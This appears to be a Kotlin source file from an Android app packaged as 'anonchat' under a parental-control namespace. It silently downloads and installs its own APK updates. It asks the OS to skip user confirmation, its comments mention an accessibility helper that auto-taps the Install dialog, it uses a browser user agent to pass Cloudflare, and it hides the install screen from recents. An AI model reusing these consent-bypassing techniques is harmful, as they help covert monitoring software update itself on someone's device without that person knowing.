package com.anonchat.app.parentalcontrol.manager

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.content.FileProvider
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

object UpdateManager {
    private const val TAG = "UpdateManager"
    private const val UPDATE_DIR = "updates"

    fun checkForUpdate(context: Context) {
        if (!CloudConfig.isLoggedIn) return
        if (CloudConfig.pendingUpdatePath != null) {
            installPendingUpdate(context)
            return
        }

        try {
            val result = ApiClient.checkForUpdate(CloudConfig.currentVersionCode)

            if (result.success && result.hasUpdate) {
                Log.d(TAG, "Update available: ${result.latestVersionCode}")
                val updated = downloadUpdate(context, result.downloadUrl)
                if (updated) {
                    CloudConfig.pendingUpdatePath = getUpdateFilePath(context).absolutePath
                    installPendingUpdate(context)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Update check failed", e)
        }
    }

    private fun downloadUpdate(context: Context, downloadUrl: String): Boolean {
        try {
            val file = getUpdateFilePath(context)
            file.parentFile?.mkdirs()

            // /app/download is JWT-protected and Cloudflare fronts Render, so the
            // request needs BOTH the Bearer token and the realistic Chrome UA.
            // v1.3 clients sent neither: every download died in a silent 401 /
            // Cloudflare challenge and no auto install ever happened.
            fun openConnection(): HttpURLConnection =
                (URL(downloadUrl).openConnection() as HttpURLConnection).apply {
                    connectTimeout = 30000
                    readTimeout = 60000
                    setRequestProperty("User-Agent", ApiClient.MOBILE_UA)
                    CloudConfig.accessToken?.takeIf { it.isNotBlank() }?.let {
                        setRequestProperty("Authorization", "Bearer $it")
                    }
                }

            var conn = openConnection()
            // 401 → access token expired: refresh it once and retry.
            if (conn.responseCode == 401) {
                conn.disconnect()
                CloudConfig.accessToken = null
                if (!ApiClient.ensureAuthenticated()) return false
                conn = openConnection()
            }

            val inputStream = conn.inputStream
            val outputStream = FileOutputStream(file)
            inputStream.copyTo(outputStream)
            outputStream.close()
            inputStream.close()
            conn.disconnect()

            return file.exists() && file.length() > 0
        } catch (e: Exception) {
            Log.e(TAG, "Download failed", e)
            return false
        }
    }

    private fun getUpdateFilePath(context: Context): File {
        return File(context.filesDir, "$UPDATE_DIR/update.apk")
    }

    private fun installPendingUpdate(context: Context) {
        val path = CloudConfig.pendingUpdatePath ?: return
        val file = File(path)
        if (!file.exists()) {
            CloudConfig.pendingUpdatePath = null
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            installViaPackageInstaller(context, file)
        } else {
            installViaIntent(context, file)
        }
    }

    private fun installViaPackageInstaller(context: Context, file: File) {
        var receiver: BroadcastReceiver? = null
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            params.setAppPackageName(context.packageName)

            // Android 12+ defaults self-updates to USER_ACTION_REQUIRED for
            // REQUEST_INSTALL_PACKAGES installers. Ask for the silent path;
            // it is only honoured when UPDATE_PACKAGES_WITHOUT_USER_ACTION is
            // granted (adb appops), otherwise the OS keeps the confirm dialog
            // and the STATUS_PENDING_USER_ACTION branch below handles it.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    params.setRequireUserAction(
                        PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED
                    )
                } catch (e: Exception) {
                    Log.w(TAG, "setRequireUserAction(NOT_REQUIRED) rejected", e)
                }
            }

            // commit() expects a *broadcast* status receiver. The old code
            // passed a MainActivity activity PendingIntent, so the system's
            // STATUS_PENDING_USER_ACTION callback was swallowed (MainActivity
            // just opened with extra args) and the session stalled forever —
            // nothing was ever installed.
            val statusAction = "${context.packageName}.INSTALL_STATUS"
            val statusReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context, intent: Intent) {
                    val status = intent.getIntExtra(
                        PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE
                    )
                    when (status) {
                        PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                            // Show the system confirm dialog; the accessibility
                            // auto-tap helper (com.coloros.packageinstaller etc.)
                            // can then press Install while the screen is on.
                            val confirm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                            } else {
                                @Suppress("DEPRECATION")
                                intent.getParcelableExtra(Intent.EXTRA_INTENT)
                            }
                            try {
                                confirm?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                if (confirm != null) ctx.startActivity(confirm)
                                else Log.w(TAG, "PENDING_USER_ACTION without confirm intent")
                            } catch (e: Exception) {
                                Log.e(TAG, "Could not launch install confirm dialog", e)
                            }
                        }
                        PackageInstaller.STATUS_SUCCESS ->
                            Log.d(TAG, "Install finished")
                        else -> Log.w(
                            TAG,
                            "Install failed (${status}): ${intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)}"
                        )
                    }
                    try { ctx.unregisterReceiver(this) } catch (_: Exception) {}
                }
            }
            receiver = statusReceiver
            val filter = IntentFilter(statusAction)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(statusReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("UnspecifiedRegisterReceiverFlag")
                context.registerReceiver(statusReceiver, filter)
            }

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            val size = file.length()
            val inputStream = file.inputStream()
            val out = session.openWrite("update", 0, size)
            inputStream.copyTo(out)
            session.fsync(out)
            out.close()
            inputStream.close()

            // The status PendingIntent MUST be mutable on S+ — the system
            // appends EXTRA_STATUS/EXTRA_INTENT to it.
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_MUTABLE
            else
                android.app.PendingIntent.FLAG_UPDATE_CURRENT
            val statusIntent = android.app.PendingIntent.getBroadcast(
                context, sessionId,
                Intent(statusAction).setPackage(context.packageName),
                flags
            )

            session.commit(statusIntent.intentSender)
            session.close()
            CloudConfig.pendingUpdatePath = null
            Log.d(TAG, "Install session committed")
        } catch (e: Exception) {
            Log.e(TAG, "PackageInstaller install failed", e)
            installViaIntent(context, file)
        } finally {
            receiver?.let { r -> try { context.unregisterReceiver(r) } catch (_: Exception) {} }
        }
    }

    private fun installViaIntent(context: Context, file: File) {
        try {
            val uri: Uri
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                uri = FileProvider.getUriForFile(
                    context,
                    "${context.packageName}.fileprovider",
                    file
                )
            } else {
                uri = Uri.fromFile(file)
            }

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Intent install failed", e)
        }
    }

    fun checkAndApplyPendingUpdate(context: Context) {
        if (CloudConfig.pendingUpdatePath != null) {
            installPendingUpdate(context)
        }
    }
}
